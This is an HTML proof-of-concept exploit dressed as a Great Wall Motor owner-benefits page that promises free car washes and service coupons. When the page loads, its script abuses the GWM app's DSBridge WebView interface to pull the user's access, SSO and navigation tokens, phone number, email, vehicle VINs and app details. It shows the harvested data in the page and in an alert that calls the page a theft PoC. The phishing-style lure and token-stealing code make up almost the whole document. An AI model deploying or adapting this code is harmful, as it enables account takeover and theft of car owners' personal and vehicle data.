<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>长城汽车 · 车主权益</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
       background:linear-gradient(135deg,#0b1f3a,#15315a);color:#fff;min-height:100vh;
       display:flex;flex-direction:column;align-items:center;padding:24px}
  .logo{font-size:20px;font-weight:700;letter-spacing:2px;margin:12px 0}
  .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
        border-radius:14px;padding:22px;width:100%;max-width:420px;margin-top:18px;
        box-shadow:0 8px 32px rgba(0,0,0,.3)}
  h3{font-size:17px;margin-bottom:10px;color:#ffd24a}
  p{font-size:13px;line-height:1.6;color:#cfd8e8}
  .btn{margin-top:18px;padding:12px 0;width:100%;border:none;border-radius:10px;
       background:linear-gradient(90deg,#c8102e,#e23a4a);color:#fff;font-size:15px;
       font-weight:600;cursor:pointer}
  .btn:active{opacity:.8}
  .log{margin-top:14px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;
       color:#8be9a0;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow:auto;
       background:rgba(0,0,0,.25);border-radius:8px;padding:10px}
</style>
</head>
<body>
<div class="logo">长城汽车 GWM</div>

<div class="card">
  <h3>您有一项车主权益待领取</h3>
  <p>您的账号存在未领取的会员权益(免费洗车 / 保养券 / 积分)。<br>
     请稍候，系统正在验证您的账号...</p>
  <button class="btn" id="go" onclick="run()">立即领取</button>
  <div class="log" id="log">[加载中...]</div>
</div>

<script>
(function(){
  if (window.dsBridge) return;
  var msgID = 0;
  var cbs = {};

  function mkArg(arg){
    if (arg === undefined || arg === null) return '{}';
    if (typeof arg === 'string') return arg;
    return JSON.stringify(arg);
  }

  function tryParse(s){
    if (s === null || s === undefined || s === '') return null;
    if (typeof s === 'object') return s;
    try { return JSON.parse(s); } catch(e){ return s; }
  }

  function call(method, arg, cb){
    var argStr = mkArg(arg);
    var ret = null;
    try { ret = window._dsbridge.call(method, argStr); }
    catch(e){ ret = null; }

    if (ret !== null && ret !== undefined && ret !== '') {
      var parsed = tryParse(ret);
      if (cb) { try { cb(parsed, true); } catch(e){} return; }
      return parsed;
    }
    if (cb) {
      msgID++;
      cbs[msgID] = { cb: cb, complete: false };
      var asyncArg;
      try { asyncArg = JSON.parse(argStr); } catch(e){ asyncArg = {}; }
      asyncArg._dscbstub = '["' + msgID + '"]';
      try { window._dsbridge.call(method, JSON.stringify(asyncArg)); }
      catch(e){ try { cb(null, true); } catch(e2){} }
    }
    return null;
  }

  window._handleMessageFromNative = function(jsonStr){
    try {
      var m = (typeof jsonStr === 'string') ? JSON.parse(jsonStr) : jsonStr;
      var id = m.callbackId;
      var entry = cbs[id];
      if (!entry) return;
      var data = (m.data !== undefined) ? m.data : m;
      var complete = m.complete !== false;
      try { entry.cb(data, complete); } catch(e){}
      if (complete) delete cbs[id];
    } catch(e){}
  };
  try { window._dsb && window._dsb.dsinit && window._dsb.dsinit({}); } catch(e){}

  window.dsBridge = { call: call };
})();

var LOG = document.getElementById('log');
var loot = [];
var NS = null;

function out(s){ LOG.textContent += '\n' + s; }

function lockNS(){
  var namespaces = ['GwmController','Controller','NativeController','Storage'];
  for (var i=0;i<namespaces.length;i++){
    var n = namespaces[i];
    try {
      var r = dsBridge.call(n + '.userCarInfo');
      if (r && typeof r === 'object' && (r.beantechToken || r.ssoToken || r.navinfoToken)) {
        return n;
      }
    } catch(e){}
  }
  for (var j=0;j<namespaces.length;j++){
    var n2 = namespaces[j];
    try {
      var r2 = dsBridge.call(n2 + '.userCarInfo');
      if (r2 && !(r2.code === -1 || r2.code === -999)) return n2;
    } catch(e){}
  }
  return 'GwmController';
}

function nsReady(){
  try { return !!(window._dsbridge && typeof window._dsbridge.call === 'function'); }
  catch(e){ return false; }
}

function run(){
  LOG.textContent = '[验证中...]';
  loot = [];

  NS = lockNS();
  out('[+] 命名空间: ' + NS);

  try {
    var u = dsBridge.call(NS + '.userInfo');
    if (u && typeof u === 'object' && u.code === undefined) {
      loot.push('[userInfo]\n  accessToken: ' + (u.accessToken||'-') +
                '\n  ssoToken: ' + (u.ssoToken||'-') +
                '\n  ptToken: ' + (u.ptToken||'-') +
                '\n  gToken: ' + (u.gToken||'-') +
                '\n  tokenId: ' + (u.tokenId||'-') +
                '\n  userId: ' + (u.userId||'-') +
                '\n  phone: ' + (u.phone||'-') +
                '\n  email: ' + (u.email||'-') +
                '\n  nickName: ' + (u.nickName||'-') +
                '\n  isLogin: ' + u.isLogin);
    } else {
      loot.push('[userInfo] 返回: ' + JSON.stringify(u));
    }
  } catch(e){ loot.push('[userInfo] 异常: ' + e); }

  try {
    var c = dsBridge.call(NS + '.userCarInfo');
    if (c && typeof c === 'object') {
      loot.push('[userCarInfo]\n  beantechToken(accessToken): ' + (c.beantechToken||'-') +
                '\n  ssoToken: ' + (c.ssoToken||'-') +
                '\n  navinfoToken(autoAiTokenId): ' + (c.navinfoToken||'-'));
    } else {
      loot.push('[userCarInfo] ' + JSON.stringify(c));
    }
  } catch(e){ loot.push('[userCarInfo] 异常: ' + e); }

  try {
    var a = dsBridge.call(NS + '.appInfo');
    loot.push('[appInfo] ' + (a && a.code===undefined ? JSON.stringify(a) : JSON.stringify(a)));
  } catch(e){ loot.push('[appInfo] 异常: ' + e); }

  try {
    var v = dsBridge.call(NS + '.defaultCarVin');
    loot.push('[defaultCarVin] ' + JSON.stringify(v));
  } catch(e){ loot.push('[defaultCarVin] 异常: ' + e); }

  try {
    var cars = dsBridge.call(NS + '.getAllCarsInfo');
    loot.push('[getAllCarsInfo] ' + JSON.stringify(cars));
  } catch(e){ loot.push('[getAllCarsInfo] 异常: ' + e); }

  try {
    var env = dsBridge.call(NS + '.currentEnv');
    loot.push('[currentEnv] ' + JSON.stringify(env));
  } catch(e){}

  flush();
}

function flush(){
  var text = '\n========== 结果 ==========\n' + loot.join('\n\n') + '\n============================';
  out(text);
  alert('【GWM Fusion JS Bridge 窃取 PoC】\n' + text);
}

function start(){
  if (nsReady()) { run(); return; }
  setTimeout(start, 200);
}
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  start();
} else {
  document.addEventListener('DOMContentLoaded', start);
}
</script>
</body>
</html>
